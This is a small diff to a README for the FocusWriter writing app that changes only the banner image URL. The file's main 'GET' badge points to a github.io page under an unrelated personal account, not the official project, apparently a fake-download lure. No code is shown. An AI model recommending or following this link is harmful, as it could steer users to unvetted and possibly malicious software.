@@ -1,6 +1,6 @@
 # FocusWriter Writing — Focused Composition & Minimal Text Workspace
 
-![FocusWriter Banner](https://justpublishingadvice.com/wp-content/uploads/2018/06/focus-writer.png)
+![FocusWriter Banner](https://www.debugpoint.com/wp-content/uploads/2016/08/focus.png)
 
 [![GET — FocusWriter](https://img.shields.io/badge/GET%20%E2%80%94%20FocusWriter-0078D6?style=for-the-badge&logoColor=white)](https://sandraedwardsc252.github.io/.github/FocusWriter-Writing)
 
